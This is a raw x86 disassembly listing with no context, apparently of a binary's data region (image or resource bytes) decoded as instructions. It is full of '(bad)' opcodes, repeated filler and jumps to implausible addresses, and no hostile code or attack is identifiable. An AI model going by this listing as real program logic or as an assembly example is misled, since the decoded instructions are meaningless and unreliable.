  414044:	rcl    ebx,cl
  414046:	sar    edi,cl
  414048:	ror    al,0xc9
  41404b:	call   DWORD PTR [ecx-0x4400b5b1]
  414051:	pusha  
  414052:	push   edi
  414053:	push   DWORD PTR [ecx+edx*2+0x69cff44]
  41405a:	add    bh,bh
  41405c:	test   al,0x13
  41405e:	add    bh,bh
  414060:	scas   eax,DWORD PTR es:[edi]
  414061:	adc    eax,0x18b8ff00
  414066:	add    bh,bh
  414068:	rcr    BYTE PTR [ebx],0x0
  41406b:	inc    edi
  41406d:	sbb    eax,0x20d0ff00
  414072:	add    bh,bh
  414074:	xlat   BYTE PTR ds:[ebx]
  414075:	and    DWORD PTR [eax],eax
  414077:	(bad)  
  414078:	fisub  WORD PTR [ebx]
  41407a:	add    bh,bh
  41407c:	call   0xf040409f
  414081:	daa    
  414082:	add    edi,edi
  414084:	cli    
  414085:	xchg   ecx,eax
  414086:	jnp    0x414087
  414088:	(bad)  
  414089:	fcmovnbe st,st(4)
  41408b:	(bad)  
  41408c:	call   ebp
  41408e:	retf   
  41408f:	(bad)  
  414090:	call   esp
  414092:	leave  
  414093:	call   esi
  414095:	mov    bh,0xae
  414097:	push   DWORD PTR [edi-0x39004c4c]
  41409d:	mov    dh,0xff
  4140a0:	retf   
  4140a1:	retf   
  4140a2:	retf   
  4140a3:	jmp    DWORD PTR [esi-0x600726c]
  4140a9:	(bad)  
  4140aa:	(bad)  
  4140ab:	(bad)  
  4140ac:	(bad)  
  4140ad:	fmul   st(5),st
  4140af:	(bad)  
  4140b0:	(bad)  
  4140b1:	fmul   st(6),st
  4140b3:	(bad)  
  4140b4:	(bad)  
  4140b5:	(bad)  
  4140b7:	(bad)  
  4140b8:	jmp    esp
  4140ba:	xlat   BYTE PTR ds:[ebx]
  4140bb:	(bad)  
  4140bc:	(bad)  
  4140bd:	mov    esi,0xc6e0ffa2
  4140c2:	mov    ebp,0xeae7e1ff
  4140c7:	jmp    DWORD PTR [eax-0x66005f60]
  4140cd:	cdq    
  4140ce:	cdq    
  4140cf:	sahf   
	...
  4140e0:	mov    ah,0xb4
  4140e2:	mov    bl,0x41
  4140e4:	int3   
  4140e5:	into   
  4140e6:	iret   
  4140e7:	xchg   esi,eax
  4140e8:	mov    bl,0xb6
  4140ea:	mov    bh,0xf1
  4140ec:	aad    0xd5
  4140ee:	(bad)  
  4140ef:	(bad)  
  4140f0:	(bad)  
  4140f2:	(bad)  
  4140f4:	hlt    
  4140f5:	hlt    
  4140f6:	hlt    
  4140f7:	(bad)  
  4140f8:	(bad)  
  4140f9:	(bad)  
  4140fa:	(bad)  
  4140fb:	(bad)  
  4140fc:	(bad)  
  4140fd:	(bad)  
  4140fe:	(bad)  
  4140ff:	(bad)  
  414100:	sti    
  414101:	cli    
  414102:	cli    
  414103:	(bad)  
  414104:	jmp    0xd2ce:0xc5ffeaea
  41410b:	call   FWORD PTR [ecx+esi*2+0x42aaff6d]
  414112:	cmp    bh,bh
  414114:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414115:	sub    ebx,DWORD PTR [esi]
  414117:	call   FWORD PTR [edi-0x5400fff8]
  41411d:	push   ss
  41411e:	add    bh,bh
  414120:	mov    dl,0x16
  414122:	add    bh,bh
  414124:	mov    edx,0xc2ff001a
  414129:	sbb    al,0x0
  41412b:	dec    ebx
  41412d:	push   ds
  41412e:	add    bh,bh
  414130:	rcr    DWORD PTR [edi],cl
  414132:	add    bh,bh
  414134:	fisub  DWORD PTR [edx]
  414136:	add    bh,bh
  414138:	jecxz  0x41415e
  41413a:	add    bh,bh
  41413c:	in     al,dx
  41413d:	pop    ds
  41413e:	add    bh,bh
  414140:	repz aaa 
  414142:	adc    edi,edi
  414144:	(bad)  
  414145:	mov    dl,0xa2
  414147:	(bad)  
  414148:	jmp    ebx
  41414a:	fdiv   st(7),st
  41414c:	(bad)  
  41414d:	fcmovbe st,st(1)
  41414f:	(bad)  
  414150:	(bad)  
  414151:	fcmovbe st,st(0)
  414153:	(bad)  
  414154:	(bad)  
  414155:	fcmovnbe st,st(0)
  414157:	dec    eax
  414159:	mov    ah,0xad
  41415b:	push   DWORD PTR [edx-0x39004e4f]
  414161:	mov    dh,0xff
  414164:	mov    dl,0xb0
  414166:	scas   eax,DWORD PTR es:[edi]
  414167:	call   ecx
  414169:	mov    ecx,0xe2ffffaf
  41416e:	aad    0xff
  414170:	jmp    edx
  414172:	(bad)  
  414173:	(bad)  
  414174:	jmp    ebp
  414176:	fdivr  st,st(7)
  414178:	(bad)  
  414179:	jmp    0xc941415d
  41417e:	mov    al,0xff
  414180:	call   0xe840fc4d
  414185:	out    dx,al
  414186:	lock jmp FWORD PTR [edx-0x69005556]
  41418d:	xchg   esi,eax
  41418e:	xchg   esi,eax
  41418f:	scas   eax,DWORD PTR es:[edi]
	...
  4141a8:	scas   eax,DWORD PTR es:[edi]
  4141a9:	mov    ah,0xb4
  4141ab:	sub    dh,BYTE PTR [ecx-0x50bf4c4d]
  4141b1:	mov    al,0xb0
  4141b3:	mov    DWORD PTR [edx-0x37004344],edi
  4141b9:	retf   0xffca
  4141bc:	fcmovu st,st(3)
  4141be:	(bad)  
  4141c0:	repz hlt 
  4141c2:	hlt    
  4141c3:	(bad)  
  4141c4:	(bad)  
  4141c5:	(bad)  
  4141c6:	(bad)  
  4141c7:	call   ebp
  4141c9:	(bad)  
  4141cb:	jmp    FWORD PTR [ebx+ecx*4+0xb91ff8a]
  4141d2:	add    bh,bh
  4141d4:	sahf   
  4141d5:	(bad)  
  4141d7:	jmp    DWORD PTR [ecx+edx*1+0x15acff00]
  4141de:	add    bh,bh
  4141e0:	mov    ch,0x17
  4141e2:	add    bh,bh
  4141e4:	mov    ebp,0xc4ff0019
  4141e9:	sbb    al,0x0
  4141eb:	dec    esi
  4141ed:	push   ds
  4141ee:	add    bh,bh
  4141f0:	(bad)  
  4141f1:	and    BYTE PTR [eax],al
  4141f3:	(bad)  
  4141f4:	fsub   QWORD PTR [ebx]
  4141f6:	add    bh,bh
  4141f8:	out    0x24,al
  4141fa:	add    bh,bh
  4141fc:	out    dx,al
  4141fd:	sbb    al,0x0
  4141ff:	(bad)  
  414200:	clc    
  414201:	push   esp
  414202:	xor    bh,bh
  414204:	call   ecx
  414206:	(bad)  
  414207:	(bad)  
  414208:	jmp    edi
  41420a:	loop   0x41420b
  41420c:	(bad)  
  41420d:	(bad)  
  41420f:	(bad)  
  414210:	(bad)  
  414211:	(bad)  
  414213:	(bad)  
  414214:	jmp    eax
  414216:	xlat   BYTE PTR ds:[ebx]
  414217:	(bad)  
  414218:	cli    
  414219:	fst    st(4)
  41421b:	inc    edx
  41421d:	mov    dl,0xad
  41421f:	(bad)  
  414220:	mov    esp,0xb9ffb5b8
  414225:	scas   al,BYTE PTR es:[edi]
  414226:	test   eax,0xcdd7edff
  41422b:	(bad)  
  41422c:	jmp    edi
  41422e:	(bad)  
  414230:	jmp    edi
  414232:	fdivp  st(7),st
  414234:	(bad)  
  414235:	jmp    0xee414218
  41423a:	out    0xff,al
  41423c:	call   ebp
  41423e:	sar    edi,0xe9
  414241:	(bad)  
  414242:	mov    eax,0xf5f2eeff
  414247:	(bad)  
  414248:	mov    ecx,0x93ffb9b9
  41424d:	xchg   ebx,eax
  41424e:	xchg   ebx,eax
  41424f:	mov    BYTE PTR [eax],0x0
	...
  414272:	add    BYTE PTR [eax],al
  414274:	scas   eax,DWORD PTR es:[edi]
  414275:	mov    dl,0xb2
  414277:	sbb    eax,0x3db3b3b1
  41427c:	scas   eax,DWORD PTR es:[edi]
  41427d:	mov    bl,0xb2
  41427f:	cwde   
  414280:	mov    ecx,0xc6ffbbbb
  414285:	mov    edi,0xd7d5ceff
  41428b:	push   DWORD PTR [ecx-0x79006766]
  414291:	add    BYTE PTR [eax],al
  414293:	call   FWORD PTR [ebp-0x5900fff6]
  414299:	adc    eax,0x15aeff00
  41429e:	add    bh,bh
  4142a0:	mov    bh,0x17
  4142a2:	add    bh,bh
  4142a4:	mov    esi,0xc6ff001b
  4142a9:	sbb    al,0x0
  4142ab:	call   eax
  4142ad:	pop    ds
  4142ae:	add    bh,bh
  4142b0:	fsub   DWORD PTR [edx]
  4142b2:	add    bh,bh
  4142b4:	fisub  WORD PTR [ebx]
  4142b6:	add    bh,bh
  4142b8:	call   0xf14042e0
  4142bd:	and    BYTE PTR [eax],al
  4142bf:	(bad)  
  4142c0:	cli    
  4142c1:	jb     0x414319
  4142c3:	(bad)  
  4142c4:	jmp    ebx
  4142c6:	fdivp  st(7),st
  4142c8:	jmp    edi
  4142ca:	loope  0x4142cb
  4142cc:	jmp    esp
  4142ce:	(bad)  
  4142d0:	jmp    esp
  4142d2:	fdiv   st(7),st
  4142d4:	jmp    esp
  4142d6:	fdiv   st(7),st
  4142d8:	jmp    esi
  4142da:	(bad)  
  4142dc:	(bad)  
  4142dd:	call   0xea4142c0
  4142e2:	(bad)  
  4142e4:	(bad)  
  4142e5:	jmp    0xec4142ca
  4142ea:	in     al,0xff
  4142ec:	(bad)  
  4142ed:	in     eax,dx
  4142ee:	in     eax,0xff
  4142f0:	(bad)  
  4142f1:	out    dx,eax
  4142f2:	call   0xea3142f6
  4142f7:	(bad)  
  4142f8:	push   ebp
  4142fa:	lock (bad) 
  4142fc:	jmp    ebx
  4142fe:	aam    0xff
  414300:	jmp    0x4142c8
  414302:	mov    ch,0xff
  414304:	repnz cmc 
  414306:	idiv   edi
  414308:	(bad)  
  414309:	(bad)
  41430c:	xchg   edx,eax
  41430d:	xchg   edx,eax
  41430e:	xchg   edx,eax
  41430f:	ficomp DWORD PTR [ebx+0xf9b9b]
	...
  41433d:	add    BYTE PTR [eax],al
  41433f:	add    BYTE PTR [ebx-0x53f3494a],dh
  414345:	mov    al,0xb0
  414347:	and    edi,DWORD PTR [edx+eax*8-0x544d243b]
  41434e:	test   eax,0x986ff
  414353:	jmp    DWORD PTR [ecx-0x5800fff9]
  414359:	adc    eax,0x16afff00
  41435e:	add    bh,bh
  414360:	mov    eax,0xbfff0018
  414365:	sbb    al,BYTE PTR [eax]
  414367:	dec    eax
  414369:	sbb    eax,0x1fd2ff00
  41436e:	add    bh,bh
  414370:	(bad)  [ecx]
  414372:	add    bh,bh
  414374:	loope  0x41439a
  414376:	add    bh,bh
  414378:	jmp    0x25:0xf3ff0022
  41437f:	(bad)  
  414380:	(bad)  
  414381:	xchg   ebp,eax
  414382:	cmp    bh,0xff
  414385:	repnz in eax,dx
  414387:	(bad)  
  414388:	(bad)  
  414389:	jmp    0x414372
  41438b:	(bad)  
  41438c:	(bad)  
  41438d:	jmp    0x414374
  41438f:	(bad)  
  414390:	(bad)  
  414391:	in     eax,dx
  414392:	out    0xff,eax
  414394:	(bad)  
  414395:	out    dx,al
  414396:	jmp    0xeb32439a
  41439b:	(bad)  
  41439c:	push   eax
  41439e:	jmp    0xffff:0xe8f0ffff
  4143a5:	out    dx,eax
  4143a6:	jmp    0xe63043aa
  4143ab:	(bad)  
  4143ac:	(bad)  
  4143ad:	jmp    0x41438f
  4143af:	(bad)  
  4143b0:	jmp    esi
  4143b2:	fcos   
  4143b4:	(bad)  
  4143b5:	(bad)  
  4143b7:	(bad)  
  4143b8:	(bad)  
  4143b9:	fcmovne st,st(4)
  4143bb:	(bad)  
  4143bc:	inc    bh
  4143be:	lods   al,BYTE PTR ds:[esi]
  4143bf:	jmp    ebx
  4143c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143c2:	(bad)  
  4143c3:	push   edx
  4143c5:	cmc    
  4143c6:	idiv   edi
  4143c8:	rcl    bl,cl
  4143ca:	sar    edi,cl
  4143cc:	lea    ecx,[ebp-0x66660f73]
  4143d2:	cdq    
  4143d3:	xor    al,0x0
	...
  414405:	add    BYTE PTR [eax],al
  414407:	add    bh,al
  414409:	into   
  41440a:	shl    DWORD PTR [ebx-0x49],1
  41440d:	mov    ebx,0x1b8affba
  414412:	adc    eax,0x1a1ff
  414417:	jmp    FWORD PTR [eax-0x4f00ffeb]
  41441d:	push   ss
  41441e:	add    bh,bh
  414420:	mov    ecx,0xc0ff0019
  414425:	sbb    eax,DWORD PTR [eax]
  414427:	dec    ecx
  414429:	push   ds
  41442a:	add    bh,bh
  41442c:	shl    DWORD PTR [edx],cl
  41442e:	add    bh,bh
  414430:	(bad)  [eax+eax*1]
  414433:	jmp    ebx
  414435:	daa    
  414436:	add    bh,bh
  414438:	in     al,dx
  414439:	and    DWORD PTR [eax],eax
  41443b:	(bad)  
  41443c:	clc    
  41443d:	cmp    BYTE PTR [edx],dl
  41443f:	(bad)  
  414440:	(bad)  
  414441:	mov    ebp,0xfdffffae
  414446:	sti    
  414447:	(bad)  
  414448:	(bad)  
  414449:	jmp    0x414430
  41444b:	(bad)  
  41444c:	jmp    esp
  41444e:	(bad)  
  414450:	(bad)  
  414451:	(bad)  
  414453:	(bad)  
  414454:	(bad)  
  414455:	fmul   st,st(0)
  414457:	(bad)  
  414458:	call   edx
  41445a:	mov    esi,0xb8cbfeff
  41445f:	(bad)  
  414460:	std    
  414461:	(bad)  
  414462:	mov    cl,0xff
  414464:	inc    dl
  414466:	test   eax,0xa0bbf7ff
  41446b:	(bad)  
  41446c:	out    dx,al
  41446d:	mov    dh,0x9d
  41446f:	(bad)  
  414470:	jmp    0xea40e42a
  414475:	mov    ebx,0xc1eaffa7
  41447a:	mov    al,0xff
  41447c:	in     eax,dx
  41447d:	les    esi,FWORD PTR [edx-0x4a3d2101]
  414483:	push   esi
  414485:	clc    
  414486:	stc    
  414487:	(bad)  
  414488:	(bad)  
  41448a:	loopne 0x41448b
  41448c:	xchg   esp,eax
  41448d:	xchg   esp,eax
  41448e:	xchg   esp,eax
  41448f:	std    
  414490:	lods   al,BYTE PTR ds:[esi]
  414491:	lods   al,BYTE PTR ds:[esi]
  414492:	lods   al,BYTE PTR ds:[esi]
  414493:	sub    al,BYTE PTR [eax]
	...
  4144c5:	add    BYTE PTR [eax],al
  4144c7:	add    al,cl
  4144c9:	int3   
  4144ca:	into   
  4144cb:	cmp    eax,0xffc4c4b8
  4144d0:	(bad)  
  4144d1:	aaa    
  4144d2:	xor    edi,edi
  4144d4:	popf   
  4144d5:	add    BYTE PTR [eax],al
  4144d7:	jmp    FWORD PTR [ecx-0x4d00ffe9]
  4144dd:	sbb    BYTE PTR [eax],al
  4144df:	(bad)  
  4144e0:	mov    esi,0xc5ff001b
  4144e5:	sbb    al,BYTE PTR [eax]
  4144e7:	call   ecx
  4144e9:	sbb    al,BYTE PTR [eax]
  4144eb:	(bad)  
  4144ec:	fst    QWORD PTR [esi]
  4144ee:	add    bh,bh
  4144f0:	jecxz  0x414505
  4144f2:	add    bh,bh
  4144f4:	jmp    0xb:0xf1ff0010
  4144fb:	push   esi
  4144fd:	daa    
  4144fe:	add    bh,bh
  414500:	clc    
  414501:	mov    WORD PTR [ebp-0x1],?
  414504:	icebp  
  414505:	scas   eax,DWORD PTR es:[edi]
  414506:	lahf   
  414507:	(bad)  
  414508:	in     al,dx
  414509:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41450a:	xchg   ebp,eax
  41450b:	(bad)  
  41450c:	jmp    0x4144b5
  41450e:	xchg   ebx,eax
  41450f:	jmp    esi
  414511:	test   al,0x95
  414513:	(bad)  
  414514:	fsubr  QWORD PTR [ebx-0x48250063]
  41451a:	stos   DWORD PTR es:[edi],eax
  41451b:	(bad)  
  41451c:	faddp  st(1),st
  41451e:	mov    bh,0xff
  414520:	in     al,0xc9
  414522:	mov    ebp,0xbfc8e3ff
  414527:	(bad)  
  414528:	fmul   st(0),st
  41452a:	sar    bh,0xd5
  41452d:	retf   0xffc4
  414530:	(bad)  
  414531:	ror    edi,1
  414533:	(bad)  
  414534:	fcomp  st(1)
  414536:	fdivr  st,st(7)
  414538:	fcmovnu st,st(6)
  41453a:	(bad)  
  41453c:	(bad)  
  41453e:	in     al,0xff
  414540:	fsubrp st(6),st
  414542:	jmp    0xe6272b3d
  414547:	jecxz  0x414527
  414549:	(bad)  
  41454b:	mov    edi,0x62bbbbbb
	...
  414588:	ret    0xc6c3
  41458b:	push   ds
  41458c:	mov    ecx,0x98ffcac7
  414591:	dec    ecx
  414592:	inc    ebp
  414593:	call   FWORD PTR [ebp-0x55010000]
  414599:	add    eax,0x4afff00
  41459e:	add    bh,bh
  4145a0:	mov    bh,0x7
  4145a2:	add    bh,bh
  4145a4:	mov    bh,0xc
  4145a6:	add    bh,bh
  4145a8:	mov    edx,0xbbff011b
  4145ad:	xor    BYTE PTR [edx],bl
  4145af:	(bad)  
  4145b0:	mov    esi,0xcaff3448
  4145b5:	pop    esi
  4145b6:	dec    ebp
  4145b7:	dec    edx
  4145b9:	jne    0x414623
  4145bb:	inc    esp
  4145bd:	nop
  4145be:	test   edi,edi
  4145c0:	retf   0xaab0
  4145c3:	dec    esi
  4145c5:	mov    edi,0xc7cfffbd
  4145ca:	(bad)  
  4145cb:	call   ebx
  4145cd:	into   
  4145ce:	into   
  4145cf:	call   eax
  4145d1:	iret   
  4145d2:	iret   
  4145d3:	dec    edi
  4145d5:	rcl    ebx,1
  4145d7:	dec    edi
  4145d9:	rcl    ebp,cl
  4145db:	dec    edi
  4145dd:	aad    0xd6
  4145df:	clc    
  4145e0:	into   
  4145e1:	rcl    ebp,cl
  4145e3:	icebp  
  4145e4:	into   
  4145e5:	rcl    esi,cl
  4145e7:	(bad)  
  4145e9:	aad    0xd7
  4145eb:	retf   0xd9d3
  4145ee:	fld    TBYTE PTR [ecx-0x7427282d]
  4145f4:	rcl    ebp,cl
  4145f6:	fcomp  DWORD PTR [esi-0x35]
  4145f9:	int3   
  4145fa:	int    0x36
  4145fc:	rcl    cl,1
  4145fe:	rcr    DWORD PTR [edx+ebx*8],1
  414601:	fcmovu st,st(2)
  414603:	push   ss
  414604:	(bad)  
  414606:	fcom   QWORD PTR [eax]
  414608:	(bad)  
  41460a:	fiadd  WORD PTR [edi]
	...
  414648:	rol    edx,0xc4
  41464b:	adc    dh,BYTE PTR [esi-0x61123d42]
  414651:	jne    0x4146c3
  414653:	inc    DWORD PTR [ebp-0x6400d6d0]
  414659:	pusha  
  41465a:	pop    edx
  41465b:	jmp    FWORD PTR [esi-0x4d008581]
  414661:	xchg   edx,eax
  414662:	nop
  414663:	push   DWORD PTR [eax-0x4a005c5c]
  414669:	mov    eax,0xc8bbffb9
  41466e:	int3   
  41466f:	inc    ecx
  414671:	rcl    ch,cl
  414673:	dec    eax
  414675:	fcomp  st(2)
  414677:	dec    ebx
  414679:	fcmovnu st,st(4)
  41467b:	dec    ebx
  41467d:	fcomp  st(2)
  41467f:	clc    
  414680:	retf   
  414681:	rcl    ah,cl
  414683:	out    0xcb,eax
  414685:	iret   
  414686:	rcr    cl,1
  414688:	retf   
  414689:	into   
  41468a:	iret   
  41468b:	leave  
  41468c:	leave  
  41468d:	int    0xce
  41468f:	stos   DWORD PTR es:[edi],eax
  414690:	int    0xcf
  414692:	rcl    BYTE PTR [eax+0x75d0cecd],1
  414698:	into   
  414699:	into   
  41469a:	into   
  41469b:	inc    ebp
  41469c:	leave  
  41469d:	retf   
  41469e:	retf   0xc828
  4146a1:	enter  0x9c8,0x0
	...
  414705:	add    BYTE PTR [eax],al
  414707:	add    BYTE PTR [eax-0x4dee5459],ch
  41470d:	mov    cl,0xb3
  41470f:	in     eax,0xc0
  414711:	leave  
  414712:	retf   0xbcff
  414715:	int3   
  414716:	iret   
  414717:	inc    esp
  414719:	rcl    dh,cl
  41471b:	inc    ebp
  41471d:	rcl    esp,1
  41471f:	test   bh,0xcf
  414722:	shr    al,cl
  414724:	leave  
  414725:	iret   
  414726:	rcl    ah,1
  414728:	enter  0xcbcb,0xbe
  41472c:	enter  0xcbc9,0xab
  414730:	(bad)  
  414731:	enter  0x92c8,0xc9
  414735:	retf   0x72ca
  414738:	leave  
  414739:	leave  
  41473a:	leave  
  41473b:	pop    eax
  41473c:	retf   
  41473d:	retf   
  41473e:	int3   
  41473f:	aaa    
  414740:	retf   0xcaca
  414743:	sbb    BYTE PTR [eax],al
	...
  4147c5:	add    BYTE PTR [eax],al
  4147c7:	add    BYTE PTR [ebx-0x58fb6065],bl
  4147cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147ce:	test   eax,0xc4c2c466
  4147d3:	nop
  4147d4:	sar    BYTE PTR [esi-0x44448641],0xbd
  4147db:	pop    edx
  4147dc:	mov    edi,0xc33dbfbd
  4147e1:	ret    
  4147e2:	ret    
  4147e3:	daa    
  4147e4:	enter  0xc9c8,0xc
	...
  41488c:	stos   DWORD PTR es:[edi],eax
  41488d:	stos   DWORD PTR es:[edi],eax
  41488e:	lods   eax,DWORD PTR ds:[esi]
  41488f:	or     dl,dl
  414891:	rcl    edx,1
  414893:	(bad)  
  414895:	ret    0x3c3
  414898:	mov    ebx,0x1bdbb
	...
  414b55:	add    BYTE PTR [eax],al
  414b57:	add    bh,bh
  414b59:	(bad)  
  414b5a:	(bad)  
  414b5b:	(bad)  
  414b5c:	(bad)  
  414b5d:	inc    DWORD PTR [eax]
  414b5f:	add    bh,bh
  414b61:	(bad)  
  414b62:	(bad)  
  414b63:	(bad)  
  414b64:	(bad)  
  414b65:	inc    DWORD PTR [eax]
  414b67:	add    bh,bh
  414b69:	(bad)  
  414b6a:	(bad)  
  414b6b:	(bad)  
  414b6c:	(bad)  
  414b6d:	inc    DWORD PTR [eax]
  414b6f:	add    bh,bh
  414b71:	(bad)  
  414b72:	cld    
  414b73:	add    BYTE PTR [edi],bl
  414b75:	inc    DWORD PTR [eax]
  414b77:	add    bh,bh
  414b79:	push   eax
  414b7b:	add    BYTE PTR [edi],al
  414b7d:	pop    DWORD PTR [eax]
  414b7f:	add    bh,bh
  414b81:	jmp    eax
  414b83:	add    BYTE PTR [ecx],al
  414b85:	add    DWORD PTR [eax],eax
  414b87:	add    bh,bh
  414b89:	inc    eax
  414b8b:	add    BYTE PTR [eax],al
  414b8d:	add    BYTE PTR [eax],al
  414b8f:	add    bh,bh
  414b91:	inc    DWORD PTR [eax+0x0]
  414b97:	add    bh,bh
  414b99:	inc    DWORD PTR [eax+0x0]
  414b9f:	add    bh,bh
  414ba1:	inc    DWORD PTR [eax+0x0]
  414ba7:	add    bh,bh
  414ba9:	inc    DWORD PTR [eax+0x0]
  414baf:	add    al,al
  414bb1:	pop    es
  414bb2:	add    BYTE PTR [eax],0x0
  414bb5:	add    BYTE PTR [eax],al
  414bb7:	add    BYTE PTR [eax+0xc001],al
  414bbd:	add    BYTE PTR [eax],al
  414bbf:	add    BYTE PTR [eax+0x7000],al
  414bc5:	sldt   WORD PTR [eax]
  414bc8:	add    BYTE PTR [eax],0xc
  414bcb:	add    BYTE PTR [eax],al
  414bcd:	sldt   WORD PTR [eax]
  414bd0:	add    BYTE PTR [eax],0x0
  414bd3:	add    BYTE PTR [eax],al
  414bd5:	sldt   WORD PTR [eax]
  414bd8:	add    BYTE PTR [eax],0x0
  414bdb:	add    BYTE PTR [eax],al
  414bdd:	sldt   WORD PTR [eax]
  414be0:	add    BYTE PTR [eax],0x0
  414be3:	add    BYTE PTR [eax],al
  414be5:	sldt   WORD PTR [eax]
  414be8:	add    BYTE PTR [eax],0x0
  414beb:	add    BYTE PTR [eax],al
  414bed:	sldt   WORD PTR [eax]
  414bf0:	add    BYTE PTR [eax],0x0
  414bf3:	add    BYTE PTR [eax],al
  414bf5:	sldt   WORD PTR [eax]
  414bf8:	add    BYTE PTR [eax],0x0
  414bfb:	add    BYTE PTR [eax],al
  414bfd:	sldt   WORD PTR [eax]
  414c00:	add    BYTE PTR [eax],0x0
  414c03:	add    BYTE PTR [eax],al
  414c05:	pop    es
  414c06:	add    BYTE PTR [eax],al
  414c08:	add    BYTE PTR [eax],0x0
  414c0b:	add    BYTE PTR [eax],al
  414c0d:	pop    es
  414c0e:	add    BYTE PTR [eax],al
  414c10:	add    BYTE PTR [eax],0x0
  414c13:	add    BYTE PTR [eax],al
  414c15:	pop    es
  414c16:	add    BYTE PTR [eax],al
  414c18:	add    BYTE PTR [eax],0x0
  414c1b:	add    BYTE PTR [eax],al
  414c1d:	pop    es
  414c1e:	add    BYTE PTR [eax],al
  414c20:	add    BYTE PTR [eax],0x0
  414c23:	add    BYTE PTR [eax],al
  414c25:	pop    es
  414c26:	add    BYTE PTR [eax],al
  414c28:	add    BYTE PTR [eax],0x0
  414c2b:	add    BYTE PTR [eax],al
  414c2d:	pop    es
  414c2e:	add    BYTE PTR [eax],al
  414c30:	add    BYTE PTR [eax],0x0
  414c33:	add    BYTE PTR [eax],al
  414c35:	pop    es
  414c36:	add    BYTE PTR [eax],al
  414c38:	add    BYTE PTR [eax],0x0
  414c3b:	add    BYTE PTR [eax],al
  414c3d:	pop    es
  414c3e:	add    BYTE PTR [eax],al
  414c40:	add    BYTE PTR [eax],0x0
  414c43:	add    BYTE PTR [eax],al
  414c45:	add    eax,DWORD PTR [eax]
  414c47:	add    BYTE PTR [eax+0x0],al
  414c4d:	add    eax,DWORD PTR [eax]
  414c4f:	add    BYTE PTR [eax+0x0],al
  414c55:	add    eax,DWORD PTR [eax]
  414c57:	add    BYTE PTR [eax+0x0],al
  414c5d:	add    eax,DWORD PTR [eax]
  414c5f:	add    BYTE PTR [eax+0x0],al
  414c65:	add    eax,DWORD PTR [eax]
  414c67:	add    al,al
  414c69:	add    BYTE PTR [eax],al
  414c6b:	add    BYTE PTR [eax],al
  414c6d:	add    eax,DWORD PTR [eax]
  414c6f:	add    al,dh
  414c71:	add    BYTE PTR [eax],al
  414c73:	add    BYTE PTR [eax],al
  414c75:	add    eax,DWORD PTR [eax]
  414c77:	add    dh,bh
  414c79:	add    BYTE PTR [eax],al
  414c7b:	add    BYTE PTR [eax],al
  414c7d:	add    DWORD PTR [eax],eax
  414c7f:	add    bh,bh
  414c81:	rol    BYTE PTR [eax],0x0
  414c84:	add    BYTE PTR [ecx],al
  414c86:	add    BYTE PTR [eax],al
  414c88:	push   eax
  414c8a:	add    BYTE PTR [eax],al
  414c8c:	add    BYTE PTR [ecx],al
  414c8e:	add    BYTE PTR [eax],al
  414c90:	push   eax
  414c92:	add    BYTE PTR [eax],al
  414c94:	add    BYTE PTR [ebx],al
  414c96:	add    BYTE PTR [eax],al
  414c98:	push   eax
  414c9a:	add    BYTE PTR [eax],al
  414c9c:	add    BYTE PTR [edi],al
  414c9e:	add    BYTE PTR [eax],al
  414ca0:	push   eax
  414ca2:	add    BYTE PTR [eax],al
  414ca4:	pop    ds
  414ca5:	inc    DWORD PTR [eax]
  414ca7:	add    bh,bh
  414ca9:	lock add BYTE PTR [edi],bl
  414cac:	(bad)  
  414cad:	inc    DWORD PTR [eax]
  414caf:	add    bh,bh
  414cb1:	lock ud0 edi,edi
  414cb5:	inc    DWORD PTR [eax]
  414cb7:	add    bh,bh
  414cb9:	clc    
  414cba:	jg     0x414cbb
  414cbc:	(bad)  
  414cbd:	inc    DWORD PTR [eax]
  414cbf:	add    bh,bh
  414cc1:	(bad)  
  414cc2:	(bad)  
  414cc3:	(bad)  
  414cc4:	(bad)  
  414cc5:	inc    DWORD PTR [eax]
  414cc7:	add    bh,bh
  414cc9:	(bad)  
  414cca:	(bad)  
  414ccb:	(bad)  
  414ccc:	(bad)  
  414ccd:	inc    DWORD PTR [eax]
  414ccf:	add    bh,bh
  414cd1:	(bad)  
  414cd2:	(bad)  
  414cd3:	(bad)  
  414cd4:	(bad)  
  414cd5:	inc    DWORD PTR [eax]
  414cd7:	add    BYTE PTR [eax],ch
  414cd9:	add    BYTE PTR [eax],al
  414cdb:	add    BYTE PTR [eax],ah
  414cdd:	add    BYTE PTR [eax],al
  414cdf:	add    BYTE PTR [eax+0x0],al
  414ce2:	add    BYTE PTR [eax],al
  414ce4:	add    DWORD PTR [eax],eax
  414ce6:	and    BYTE PTR [eax],al
  414ce8:	add    BYTE PTR [eax],al
  414cea:	add    BYTE PTR [eax],al
  414cec:	adc    BYTE PTR [eax],0x0
	...
  414e3b:	add    BYTE PTR [eax-0x47fb4f50],dh
  414e41:	mov    eax,0xaaaa4ab8
  414e46:	stos   BYTE PTR es:[edi],al
  414e47:	xchg   BYTE PTR [esi-0x4669494a],dh
  414e4d:	mov    ecx,0xa1a195b9
  414e52:	mov    eax,ds:0x81818195
  414e57:	xchg   DWORD PTR [edi+0x77],esi
  414e5a:	ja     0x414eaa
  414e5c:	jbe    0x414ed4
  414e5e:	jbe    0x414e66
	...
  414eb8:	sahf   
  414eb9:	sahf   
  414eba:	sahf   
  414ebb:	fs mov edi,0xd5d5d9c7
  414ec2:	aad    0xff
  414ec4:	fstp   st(5)
  414ec6:	(bad)  
  414ec8:	loop   0x414eac
  414eca:	loop   0x414ecb
  414ecc:	fcmovu st,st(2)
  414ece:	(bad)  
  414ed0:	(bad)  
  414ed1:	(bad)  
  414ed2:	(bad)  
  414ed3:	(bad)  
  414ed4:	(bad)  
  414ed6:	fdiv   st(7),st
  414ed8:	enter  0xc8c8,0xff
  414edc:	mov    ds:0x97bda2a2,al
  414ee1:	xchg   edi,eax
  414ee2:	xchg   edi,eax
  414ee3:	pop    edi
	...
  414ef0:	add    BYTE PTR [eax],al
  414ef2:	add    BYTE PTR [edx],al
  414ef4:	add    BYTE PTR [eax],al
  414ef6:	add    BYTE PTR [ecx],al
	...
  414f30:	xchg   edi,eax
  414f31:	xchg   edi,eax
  414f32:	xchg   edi,eax
  414f33:	or     ebp,DWORD PTR [edi-0x26185051]
  414f39:	(bad)  
  414f3b:	(bad)  
  414f3c:	(bad)  
  414f3e:	fcos   
  414f40:	(bad)  
  414f42:	fdiv   st(7),st
  414f44:	loopne 0x414f26
  414f46:	loopne 0x414f47
